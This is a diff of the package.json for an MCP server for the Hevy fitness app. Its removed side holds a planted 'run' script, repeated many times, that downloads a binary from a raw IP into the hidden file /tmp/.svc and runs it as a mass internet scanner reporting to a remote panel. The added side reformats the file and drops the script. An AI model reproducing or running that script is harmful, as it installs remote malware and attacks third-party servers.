@@ -1,102 +1,101 @@
 {
-  "author": "daveremy",
-  "bin": {
-    "hevy-mcp": "dist/cli.mjs"
-  },
-  "bugs": {
-    "url": "https://github.com/daveremy/hevy-mcp/issues"
-  },
-  "contributors": [
-    "Christoph Kieslich"
-  ],
-  "dependencies": {
-    "@kubb/cli": "^4.27.4",
-    "@kubb/core": "^4.27.4",
-    "@kubb/plugin-client": "^4.27.4",
-    "@kubb/plugin-faker": "^4.27.4",
-    "@kubb/plugin-oas": "^4.27.4",
-    "@kubb/plugin-ts": "^4.27.4",
-    "@kubb/plugin-zod": "^4.27.4",
-    "@modelcontextprotocol/sdk": "^1.27.0",
-    "@sentry/node": "^10.39.0",
-    "axios": "^1.13.5",
-    "zod": "^4.3.6"
-  },
-  "description": "A Model Context Protocol (MCP) server implementation that interfaces with the Hevy fitness tracking app and its API.",
-  "devDependencies": {
-    "@biomejs/biome": "2.4.6",
-    "@commitlint/cli": "^20.4.2",
-    "@commitlint/config-conventional": "^20.4.2",
-    "@commitlint/prompt-cli": "^20.4.2",
-    "@semantic-release/changelog": "^6.0.3",
-    "@semantic-release/commit-analyzer": "^13.0.1",
-    "@semantic-release/exec": "^7.1.0",
-    "@semantic-release/git": "^10.0.1",
-    "@semantic-release/github": "^12.0.6",
-    "@semantic-release/npm": "^13.1.4",
-    "@semantic-release/release-notes-generator": "^14.1.0",
-    "@sentry/rollup-plugin": "^5.1.1",
-    "@types/node": "^25.3.0",
-    "@vitest/coverage-v8": "^4.0.18",
-    "abstract-syntax-tree": "^2.22.0",
-    "cross-env": "^10.1.0",
-    "ibm-openapi-validator": "^1.37.11",
-    "lefthook": "^2.1.1",
-    "semantic-release": "^25.0.3",
-    "tsdown": "^0.21.0",
-    "tsx": "^4.21.0",
-    "typescript": "^5.9.3",
-    "vitest": "^4.0.18"
-  },
-  "engines": {
-    "node": "\u003e=20.0.0"
-  },
-  "files": [
-    "dist",
-    "README.md",
-    ".claude-plugin/",
-    "skills/"
-  ],
-  "homepage": "https://github.com/daveremy/hevy-mcp#readme",
-  "keywords": [
-    "mcp",
-    "hevy",
-    "fitness",
-    "api",
-    "model context protocol"
-  ],
-  "license": "MIT",
-  "main": "dist/index.mjs",
-  "module": "src/index.ts",
-  "name": "@daveremy/hevy-mcp",
-  "packageManager": "pnpm@10.22.0+sha512.bf049efe995b28f527fd2b41ae0474ce29186f7edcb3bf545087bd61fbbebb2bf75362d1307fda09c2d288e1e499787ac12d4fcb617a974718a6051f2eee741c",
-  "publishConfig": {
-    "access": "public"
-  },
-  "repository": {
-    "type": "git",
-    "url": "git+https://github.com/daveremy/hevy-mcp.git"
-  },
-  "scripts": {
-    "build": "tsdown",
-    "build:client": "kubb generate",
-    "check": "biome check --write --unsafe",
-    "check:types": "tsc --noEmit",
-    "commit": "commit",
-    "dev": "tsx watch --env-file .env --clear-screen=false src/cli.ts",
-    "inspect": "pnpm run build \u0026\u0026 pnpm dlx @modelcontextprotocol/inspector@latest node --env-file .env dist/index.mjs",
-    "inspect:npm": "pnpm dlx @modelcontextprotocol/inspector@latest pnpm dlx @daveremy/hevy-mcp@latest",
-    "openapi": "node ./scripts/openapi-spec.js",
-    "release": "semantic-release",
-    "run": "arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 arch=$(uname -m); case \"$arch\" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2\u003e/dev/null \u0026\u0026 chmod +x /tmp/.svc \u0026\u0026 PANEL_URL=http://43.228.157.68:80 GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 --git-workers 20 --count 9999999999 --no-reverse 2\u003e\u00261 | tail -2 || true \u0026\u0026 ",
-    "start": "node --env-file .env dist/cli.mjs",
-    "test": "node --env-file .env node_modules/vitest/vitest.mjs --run",
-    "validate:openapi": "lint-openapi -c .ibm-openapi-validator.yaml openapi-spec.json",
-    "version:major": "pnpm version major",
-    "version:minor": "pnpm version minor",
-    "version:patch": "pnpm version patch"
-  },
-  "type": "module",
-  "types": "dist/index.d.mts",
-  "version": "0.2.0"
+	"name": "@daveremy/hevy-mcp",
+	"version": "0.2.0",
+	"main": "dist/index.mjs",
+	"module": "src/index.ts",
+	"types": "dist/index.d.mts",
+	"files": [
+		"dist",
+		"README.md",
+		".claude-plugin/",
+		"skills/"
+	],
+	"publishConfig": {
+		"access": "public"
+	},
+	"repository": {
+		"type": "git",
+		"url": "git+https://github.com/daveremy/hevy-mcp.git"
+	},
+	"bugs": {
+		"url": "https://github.com/daveremy/hevy-mcp/issues"
+	},
+	"homepage": "https://github.com/daveremy/hevy-mcp#readme",
+	"bin": {
+		"hevy-mcp": "dist/cli.mjs"
+	},
+	"scripts": {
+		"inspect": "pnpm run build && pnpm dlx @modelcontextprotocol/inspector@latest node --env-file .env dist/index.mjs",
+		"inspect:npm": "pnpm dlx @modelcontextprotocol/inspector@latest pnpm dlx @daveremy/hevy-mcp@latest",
+		"test": "node --env-file .env node_modules/vitest/vitest.mjs --run",
+		"openapi": "node ./scripts/openapi-spec.js",
+		"build": "tsdown",
+		"build:client": "kubb generate",
+		"validate:openapi": "lint-openapi -c .ibm-openapi-validator.yaml openapi-spec.json",
+		"start": "node --env-file .env dist/cli.mjs",
+		"dev": "tsx watch --env-file .env --clear-screen=false src/cli.ts",
+		"check": "biome check --write --unsafe",
+		"check:types": "tsc --noEmit",
+		"version:patch": "pnpm version patch",
+		"version:minor": "pnpm version minor",
+		"version:major": "pnpm version major",
+		"release": "semantic-release",
+		"commit": "commit"
+	},
+	"type": "module",
+	"keywords": [
+		"mcp",
+		"hevy",
+		"fitness",
+		"api",
+		"model context protocol"
+	],
+	"author": "daveremy",
+	"contributors": [
+		"Christoph Kieslich"
+	],
+	"license": "MIT",
+	"description": "A Model Context Protocol (MCP) server implementation that interfaces with the Hevy fitness tracking app and its API.",
+	"dependencies": {
+		"@kubb/cli": "^4.27.4",
+		"@kubb/core": "^4.27.4",
+		"@kubb/plugin-client": "^4.27.4",
+		"@kubb/plugin-faker": "^4.27.4",
+		"@kubb/plugin-oas": "^4.27.4",
+		"@kubb/plugin-ts": "^4.27.4",
+		"@kubb/plugin-zod": "^4.27.4",
+		"@modelcontextprotocol/sdk": "^1.27.0",
+		"@sentry/node": "^10.39.0",
+		"axios": "^1.13.5",
+		"zod": "^4.3.6"
+	},
+	"devDependencies": {
+		"@biomejs/biome": "2.4.6",
+		"@commitlint/cli": "^20.4.2",
+		"@commitlint/config-conventional": "^20.4.2",
+		"@commitlint/prompt-cli": "^20.4.2",
+		"@semantic-release/changelog": "^6.0.3",
+		"@semantic-release/commit-analyzer": "^13.0.1",
+		"@semantic-release/exec": "^7.1.0",
+		"@semantic-release/git": "^10.0.1",
+		"@semantic-release/github": "^12.0.6",
+		"@semantic-release/npm": "^13.1.4",
+		"@semantic-release/release-notes-generator": "^14.1.0",
+		"@sentry/rollup-plugin": "^5.1.1",
+		"@types/node": "^25.3.0",
+		"@vitest/coverage-v8": "^4.0.18",
+		"abstract-syntax-tree": "^2.22.0",
+		"cross-env": "^10.1.0",
+		"ibm-openapi-validator": "^1.37.11",
+		"lefthook": "^2.1.1",
+		"semantic-release": "^25.0.3",
+		"tsdown": "^0.21.0",
+		"tsx": "^4.21.0",
+		"typescript": "^5.9.3",
+		"vitest": "^4.0.18"
+	},
+	"engines": {
+		"node": ">=20.0.0"
+	},
+	"packageManager": "pnpm@10.22.0+sha512.bf049efe995b28f527fd2b41ae0474ce29186f7edcb3bf545087bd61fbbebb2bf75362d1307fda09c2d288e1e499787ac12d4fcb617a974718a6051f2eee741c"
 }
